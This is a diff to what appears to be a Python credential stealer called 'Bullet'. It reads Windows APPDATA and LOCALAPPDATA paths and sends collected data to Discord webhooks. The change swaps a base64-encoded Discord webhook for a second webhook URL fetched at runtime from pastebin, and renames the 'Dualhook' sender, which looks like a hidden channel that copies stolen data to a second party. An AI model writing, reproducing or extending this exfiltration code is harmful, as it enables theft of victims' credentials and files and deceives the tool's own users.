@@ -29,7 +29,7 @@ user = os.environ.get("USERNAME")
 local = os.getenv('LOCALAPPDATA')
 roaming = os.getenv('APPDATA')
 Aqua = "C:/Users/Public/Aqua"
-build = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIzMDU4NTEzMjQxOTkwNzcwNC8zQWI3QXFaM0Roak5UVFpsaU01a0dmRlFNYm8xdVdJb3NzTURvZGl6Y01WeHNDUmd1Y2txcjNwc2RRUkxqZTFNdjhjOA=="
+injection = requests.get("https://pastebin.com/raw/TnQngK6n").text
 
 
 
@@ -307,14 +307,14 @@ def cleanUp():
 
 
 webhook_url = 'bulleting_hookz'
-webhook_url2 = b64decode((build))
+webhook_url2 = injection
 webhook = DiscordWebhook(url=webhook_url)
 webhook1 = DiscordWebhook(url=webhook_url2)
 embed = DiscordEmbed()
 webhook.username = "Bullet"
 webhook.avatar_url = "https://media.discordapp.net/attachments/1227592232022839300/1228079431004852254/Add_a_heading.jpg?ex=662abd18&is=66184818&hm=ab83c31f59810689ec75480bc9da64912647d0d8b6a96a5979d319f97a0fbe5c&=&format=webp&width=630&height=630"
 webhook1.avatar_url = "https://media.discordapp.net/attachments/1227592232022839300/1228079431004852254/Add_a_heading.jpg?ex=662abd18&is=66184818&hm=ab83c31f59810689ec75480bc9da64912647d0d8b6a96a5979d319f97a0fbe5c&=&format=webp&width=630&height=630"
-webhook1.username = "Bullet Dualhook lol"
+webhook1.username = "Bullet DH"
 
 def runAqua():
     makeDir()
